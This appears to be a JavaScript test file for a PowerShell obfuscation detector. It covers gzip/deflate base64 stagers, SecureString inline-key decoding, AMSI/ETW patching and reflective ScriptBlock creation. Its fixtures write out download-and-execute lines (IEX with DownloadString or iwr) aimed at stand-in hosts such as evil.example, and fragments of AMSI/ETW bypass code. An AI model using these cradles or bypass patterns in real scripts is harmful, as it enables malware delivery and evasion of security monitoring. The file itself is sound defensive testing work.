'use strict';
// ════════════════════════════════════════════════════════════════════════════
// cmd-obfuscation-phase4-layered.test.js — Phase D layered decode chains.
//
// Phase D adds four families to cmd-obfuscation.js:
//
//   1. `IO.Compression.GzipStream` / `DeflateStream` + FromBase64String
//      (literal or $var) — actual gzip/deflate decode via Decompressor.
//   2. `ConvertTo-SecureString -Key @(…)` with inline byte key —
//      structural recognizer (critical IOC; no Web Crypto in sync path).
//   3. Broadened AMSI / ETW reflective patching family
//      (AmsiScanBuffer, EtwEventWrite, VirtualProtect, delegate emit).
//   4. Reflective `[ScriptBlock].GetMethod("Create",...).Invoke($null,@(…))`.
//
// Matches the architecture: every sink emits a `cmd-obfuscation` candidate
// with a `_patternIocs` mirror at the right severity, clips through
// `_clipDeobfToAmpBudget`, and runs through `_processCommandObfuscation`.
// ════════════════════════════════════════════════════════════════════════════

const test = require('node:test');
const assert = require('node:assert/strict');
const zlib = require('node:zlib');
const { loadModules, host } = require('../helpers/load-bundle.js');

const ctx = loadModules([
  'src/constants.js',
  'src/encoded-content-detector.js',
  'src/decoders/safelinks.js',
  'src/decoders/whitelist.js',
  'src/decoders/entropy.js',
  'src/decoders/ioc-extract.js',
  'src/decoders/base64-hex.js',
  'src/decoders/cmd-obfuscation.js',
  'src/decoders/ps-mini-evaluator.js',
]);

// Decompressor stub — delegates to Node's zlib so the Gzip/Deflate
// stager branch can produce real inflated previews in tests.
ctx.Decompressor = {
  inflateSync(bytes, format) {
    try {
      const buf = Buffer.from(bytes.buffer || bytes, bytes.byteOffset || 0, bytes.byteLength || bytes.length);
      if (format === 'gzip') return new Uint8Array(zlib.gunzipSync(buf));
      if (format === 'deflate-raw') return new Uint8Array(zlib.inflateRawSync(buf));
      if (format === 'deflate' || format === 'zlib') return new Uint8Array(zlib.inflateSync(buf));
      return null;
    } catch (_) { return null; }
  },
};

const { EncodedContentDetector } = ctx;
const d = new EncodedContentDetector();
function pick(cands, pred) { return host(cands.filter(pred)); }

// ── 1. Gzip / Deflate stager ──────────────────────────────────────────────

test('phase-D: GzipStream + FromBase64String (literal) inflates real payload', () => {
  const inner = 'Invoke-Expression (iwr http://evil.example/p.ps1)';
  const gzBytes = zlib.gzipSync(Buffer.from(inner, 'utf8'));
  const b64 = gzBytes.toString('base64');
  const text = [
    `$bytes = [Convert]::FromBase64String('${b64}')`,
    '$ms = New-Object IO.MemoryStream(,$bytes)',
    '$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)',
    '$sr = New-Object IO.StreamReader($gz)',
    'iex $sr.ReadToEnd()',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Gzip Stager/.test(c.technique));
  assert.ok(hits.length >= 1, `expected gzip hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
  assert.equal(hits[0]._patternIocs[0].severity, 'high');
});

test('phase-D: DeflateStream + FromBase64String (literal) inflates real payload', () => {
  const inner = 'IEX (New-Object Net.WebClient).DownloadString("http://c2/a.ps1")';
  const dfBytes = zlib.deflateRawSync(Buffer.from(inner, 'utf8'));
  const b64 = dfBytes.toString('base64');
  const text = [
    `$b = [Convert]::FromBase64String('${b64}')`,
    '$ms = New-Object IO.MemoryStream(,$b)',
    '$df = New-Object IO.Compression.DeflateStream($ms, [IO.Compression.CompressionMode]::Decompress)',
    '$sr = New-Object IO.StreamReader($df); iex $sr.ReadToEnd()',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Deflate Stager/.test(c.technique));
  assert.ok(hits.length >= 1, `expected deflate hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /IEX|DownloadString/);
});

test('phase-D: Gzip stager with $var-held base64 resolves via symbol table', () => {
  const inner = 'Invoke-Expression (iwr http://e/p)';
  const gzBytes = zlib.gzipSync(Buffer.from(inner, 'utf8'));
  const b64 = gzBytes.toString('base64');
  const text = [
    `$b64 = '${b64}'`,
    '$bytes = [Convert]::FromBase64String($b64)',
    '$ms = New-Object IO.MemoryStream(,$bytes)',
    '$gz = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)',
    'iex (New-Object IO.StreamReader($gz)).ReadToEnd()',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /Gzip Stager/.test(c.technique));
  assert.ok(hits.length >= 1, `expected var-b64 gzip hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /Invoke-Expression/);
});

// ── 2. SecureString with inline key (structural) ──────────────────────────

test('phase-D: ConvertTo-SecureString -Key @(...) with 32-byte key fires', () => {
  // Pre-compute a 32-byte key array (AES-256 size) and a realistic-length
  // ciphertext base64 (>= 16 chars). The branch is structural so the
  // contents don't have to decrypt to anything meaningful.
  const key = Array.from({length: 32}, (_, i) => 0x30 + (i % 10));
  const keyArr = key.join(',');
  const ct = Buffer.alloc(48, 0xaa).toString('base64');
  const text = `ConvertTo-SecureString -String '${ct}' -Key @(${keyArr})`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /SecureString Decode/.test(c.technique));
  assert.ok(hits.length >= 1, `expected SecureString hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._patternIocs[0].severity, 'critical');
  assert.match(hits[0].deobfuscated, /AES-256.*32 bytes/);
});

test('phase-D: SecureString -Key @(16 bytes) AES-128 form fires', () => {
  const key = Array.from({length: 16}, (_, i) => 0x42 + i);
  const keyArr = key.join(',');
  const ct = Buffer.alloc(32, 0x33).toString('base64');
  const text = `ConvertTo-SecureString '${ct}' -Key @(${keyArr})`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /SecureString Decode/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /AES-128.*16 bytes/);
});

test('phase-D: SecureString -Key with non-AES-size (20 bytes) does NOT fire', () => {
  const key = Array.from({length: 20}, (_, i) => 0x42 + i);
  const ct = Buffer.alloc(32, 0x33).toString('base64');
  const text = `ConvertTo-SecureString '${ct}' -Key @(${key.join(',')})`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /SecureString Decode/.test(c.technique));
  // 20 is not a valid AES key length — the key-array regex enforces the
  // byte count via `{15,31}` and then the size check rejects non-
  // 16/24/32 totals.
  assert.equal(hits.length, 0);
});

// ── 3. Broadened AMSI / ETW reflective patching ───────────────────────────

test('phase-D: `AmsiScanBuffer` + `VirtualProtect` fires the broadened branch', () => {
  const text = [
    '$proc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(',
    '  [System.Runtime.InteropServices.Marshal]::GetProcAddress($amsi, "AmsiScanBuffer"),',
    '  [VirtualProtect])',
    '$proc.Invoke()',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /AMSI\/ETW Reflective Patch/.test(c.technique));
  assert.ok(hits.length >= 1, `expected AMSI/ETW hit; got: ${JSON.stringify(host(cands))}`);
  assert.equal(hits[0]._patternIocs[0].severity, 'critical');
  assert.match(hits[0].deobfuscated, /AmsiScanBuffer/);
});

test('phase-D: `EtwEventWrite` + `GetDelegateForFunctionPointer` fires', () => {
  const text = [
    '$addr = [Runtime.InteropServices.Marshal]::GetProcAddress($ntdll, "EtwEventWrite")',
    '$deleg = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [PatcherDelegate])',
  ].join('\n');
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /AMSI\/ETW Reflective Patch/.test(c.technique));
  assert.ok(hits.length >= 1);
  assert.match(hits[0].deobfuscated, /EtwEventWrite/);
});

// ── 4. Reflective [ScriptBlock].GetMethod("Create", ...).Invoke ───────────

test('phase-D: reflective ScriptBlock.GetMethod("Create").Invoke resolves body', () => {
  // Line 37 of examples/encoded-payloads/mixed-obfuscations.txt.
  // Use double-quoted outer to avoid inner-quote escaping headaches.
  const body = 'IEX (New-Object Net.WebClient).DownloadString("http://evil.example/p")';
  const text = `$method = [System.Management.Automation.ScriptBlock].GetMethod("Create", [Type[]]@([string])); $method.Invoke($null, @('${body}'))`;
  const cands = d._findCommandObfuscationCandidates(text, {});
  const hits = pick(cands, c => /scriptblock.*\(reflection\)/.test(c.technique));
  assert.ok(hits.length >= 1, `expected reflective SB hit; got: ${JSON.stringify(host(cands))}`);
  assert.match(hits[0].deobfuscated, /IEX/);
});

// ── 5. Amp-budget invariant on every Phase D candidate ───────────────────

test('phase-D: every Phase D candidate respects the 32x amp-budget', () => {
  // Run all four families through one pass and check the invariant.
  const gzPayload = 'Invoke-Expression iex';
  const gzBytes = zlib.gzipSync(Buffer.from(gzPayload, 'utf8'));
  const gzB64 = gzBytes.toString('base64');
  const texts = [
    `$b=[Convert]::FromBase64String('${gzB64}'); $ms=New-Object IO.MemoryStream(,$b); $gz=New-Object IO.Compression.GzipStream($ms,[IO.Compression.CompressionMode]::Decompress); iex (New-Object IO.StreamReader($gz)).ReadToEnd()`,
    `ConvertTo-SecureString '${Buffer.alloc(32,0x11).toString('base64')}' -Key @(${Array.from({length:32},(_,i)=>i).join(',')})`,
    `[System.Management.Automation.ScriptBlock].GetMethod("Create", [Type[]]@([string])).Invoke($null, @('iex (iwr http://x)'))`,
  ];
  for (const text of texts) {
    const cands = d._findCommandObfuscationCandidates(text, {});
    for (const c of cands) {
      if (typeof c.deobfuscated === 'string' && typeof c.raw === 'string') {
        assert.ok(
          c.deobfuscated.length <= 32 * Math.max(1, c.raw.length),
          `amp violation: raw=${c.raw.length} deobf=${c.deobfuscated.length} technique=${c.technique}`,
        );
      }
    }
  }
});
